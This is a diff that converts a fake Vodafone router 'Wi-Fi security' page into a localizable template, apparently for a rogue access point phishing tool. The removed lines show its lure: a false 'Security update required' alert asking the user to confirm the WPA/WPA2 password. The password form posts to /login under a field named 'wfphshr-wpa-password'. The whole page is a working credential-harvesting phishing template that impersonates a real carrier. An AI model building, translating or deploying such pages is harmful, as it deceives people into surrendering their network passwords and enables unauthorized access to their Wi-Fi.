@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{html_lang}}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vodafone — Router</title>
+    <title>{{page_title}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, Helvetica, sans-serif; background: #f2f2f2; color: #333; min-height: 100vh; }
@@ -35,37 +35,37 @@
 </head>
 <body>
     <div class="header">
-        <div><h1>Vodafone</h1><small>Station / Router</small></div>
+        <div><h1>Vodafone</h1><small>{{header_subtitle}}</small></div>
     </div>
     <div class="tabs">
-        <a href="#">Home</a><a href="#" class="on">Wi-Fi</a><a href="#">Internet</a><a href="#">System</a>
+        <a href="#">{{tab_home}}</a><a href="#" class="on">{{tab_wifi}}</a><a href="#">{{tab_internet}}</a><a href="#">{{tab_system}}</a>
     </div>
     <div class="wrap">
         <div class="card">
-            <div class="card-title">Wi-Fi security</div>
+            <div class="card-title">{{card_title}}</div>
             <div class="card-body">
                 <div class="alert">
-                    <strong>Security update required</strong>
-                    A router security update is waiting. Please confirm your WPA/WPA2 password so the new wireless settings can be applied safely.
+                    <strong>{{alert_title}}</strong>
+                    {{alert_body}}
                 </div>
                 <form method="POST" action="/login">
                     <div class="grid">
                         <div class="row">
-                            <div class="lbl">Encryption</div>
-                            <div class="val">WPA2 (AES)</div>
+                            <div class="lbl">{{lbl_encryption}}</div>
+                            <div class="val">{{val_encryption}}</div>
                         </div>
                         <div class="row">
-                            <label class="lbl" for="wpa">Wi-Fi password</label>
+                            <label class="lbl" for="wpa">{{lbl_wifi_password}}</label>
                             <div>
-                                <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="WPA pre-shared key" required autocomplete="current-password">
+                                <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password">
                             </div>
                         </div>
                     </div>
-                    <div class="btn-row"><button type="submit" class="btn">Save</button></div>
+                    <div class="btn-row"><button type="submit" class="btn">{{btn_save}}</button></div>
                 </form>
             </div>
         </div>
-        <div class="foot">Gateway configuration</div>
+        <div class="foot">{{footer}}</div>
     </div>
 </body>
 </html>
